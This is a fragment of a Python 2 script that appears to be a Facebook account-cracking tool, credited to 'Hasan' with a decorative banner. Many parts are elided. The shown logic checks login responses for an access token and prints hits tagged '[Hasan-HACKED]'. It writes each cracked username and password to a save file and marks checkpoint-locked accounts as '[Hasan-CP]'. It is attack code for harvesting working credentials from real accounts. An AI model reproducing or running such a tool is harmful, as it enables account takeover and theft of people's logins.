...
\033[0;96m    _    _                       
\033[0;96m   | |  | |                      
\033[0;96m   | |__| | __ _ ___  __ _ _ __  
\033[0;96m   |  __  |/ _` / __|/ _` | '_ \ 
\033[0;96m   | |  | | (_| \__ \ (_| | | | |
\033[0;96m   |_|  |_|\__,_|___/\__,_|_| |_|
""")

print("\033[0;91mThis Tool's Free By Hasan")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Hasan'
    print '\033[0;94mFACEBOOK : Biplob Hasan '
    print '\033[0;96mGITHUB   : Hasan-XD'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Hasan-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Hasan-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
